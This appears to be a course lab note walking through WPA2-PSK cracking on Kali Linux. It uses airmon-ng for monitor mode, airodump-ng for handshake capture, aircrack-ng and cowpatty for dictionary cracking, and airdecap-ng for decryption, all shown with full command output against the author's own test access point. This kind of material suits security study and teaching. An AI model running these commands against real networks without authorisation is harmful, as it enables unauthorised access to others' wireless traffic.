#### Part 23: WPA2-PSK Cracking 

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Configure the AP to use ```WPA2-PSK```

![Image of Config](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_23_1.png)

```airodump-ng``` output for ```WPA2-PSK``` networks

The moment a new client connects we capture the ```WPA handshake```

```sh
root@kali:~# airodump-ng --channel 4 --essid dlink wlan0mon --write wpa2-psk

 CH  4 ][ Elapsed: 6 mins ][ 2017-06-07 14:24 ][ WPA handshake: 84:C9:B2:6D:0C:85

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -32  47     2465      322    0   4  54e. WPA2 CCMP   PSK  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   80:D2:1D:44:EA:44  -56    0 - 1      0       21  NETGEAR10
 (not associated)   5C:51:88:9E:3C:95  -61    0 - 1     21        8
 (not associated)   F4:F5:D8:2F:99:D0  -62    0 - 1      0       44  Lowspeed
 (not associated)   5C:93:A2:A9:09:33  -62    0 - 1      0       14
 (not associated)   14:F6:5A:65:FF:D7  -65    0 - 1      0       10  DIRECT-Xc-BRAVIA
 (not associated)   60:F1:89:EF:88:4C  -66    0 - 1      0       15  vzinet
 (not associated)   64:80:99:D7:8E:03  -67    0 - 1     51       10  ATT016,Kaiser
 (not associated)   F0:25:B7:45:39:83  -67    0 - 1      0        1
 (not associated)   FA:06:AB:27:64:BA  -71    0 - 1      0        1
 (not associated)   8C:8E:F2:5D:A9:87  -70    0 - 1      0        2
 (not associated)   84:B5:41:4A:25:5C  -61    0 - 1      0        3
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -30   36e-24      1      208  HiddenSSID,dlink

root@kali:~#
```

Open the ```wpa2-psk-01.cap``` file in ```Wireshark```

Set the filter as ```eapol``` and see if you captured the 4 way handshake

![Image of Wireshark](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_23_2.jpeg)

Cracking ```WPA2-PSK``` using ```aircrack-ng```

```sh
root@kali:~# aircrack-ng wpa2-psk-01.cap -w dictionary.txt
Opening wpa2-psk-01.cap
Read 729 packets.

   #  BSSID              ESSID                     Encryption

   1  84:C9:B2:6D:0C:85  dlink                     WPA (1 handshake)

Choosing first network as target.

Opening wpa2-psk-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:00] 1/0 keys tested (160.59 k/s)

      Time left: 0 seconds                                   inf%

                         KEY FOUND! [ samplepsk123 ]


      Master Key     : 7F B8 B9 62 2C 1B CF 4D 39 37 9B 31 BD 5C FA C0
                       8F BB CB 2E D3 92 DB CF B8 C9 CA 7B 7D 1A D3 CE

      Transient Key  : 14 B6 F5 AA 82 9E 48 15 08 67 AF D1 A4 37 F3 6A
                       77 38 2A 4C 3A 46 CD 9D 3D 6C C5 A1 A8 45 9F BC
                       83 31 1D E3 2D AC 32 BE F8 F0 EA B9 91 6C 5D E0
                       DB 7B E7 13 4A 81 AB 54 25 6C 65 89 14 20 40 61

      EAPOL HMAC     : 17 B1 21 22 A3 F4 74 52 B3 8A 4C 51 FD 10 93 59
root@kali:~#
```

Cracking ```WPA2-PSK``` using ```cowpatty```

```sh
root@kali:~# cowpatty -f dictionary.txt -r wpa2-psk-01.cap -s dlink
cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "samplepsk123".

1 passphrases tested in 0.00 seconds:  307.41 passphrases/second
root@kali:~#
```

Decrypting packets using ```airdecap-ng```

```sh
root@kali:~# airdecap-ng -e dlink -p samplepsk123 wpa2-psk-01.cap
Total number of packets read          1035
Total number of WEP data packets         0
Total number of WPA data packets       285
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        19
root@kali:~# ls -la wpa2-psk-01*
-rw-r--r-- 1 root root 97815 Jun  7 14:24 wpa2-psk-01.cap
-rw-r--r-- 1 root root  4727 Jun  7 14:24 wpa2-psk-01.csv
-rw-r--r-- 1 root root  2267 Jun  7 14:24 wpa2-psk-01-dec.cap
-rw-r--r-- 1 root root   587 Jun  7 14:24 wpa2-psk-01.kismet.csv
-rw-r--r-- 1 root root 54263 Jun  7 14:24 wpa2-psk-01.kismet.netxml
root@kali:~# file wpa2-psk-01-dec.cap
wpa2-psk-01-dec.cap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
root@kali:~#
```

![Image of Demo](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_23_3.png)
![Image of Wireshark](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_23_4.jpeg)
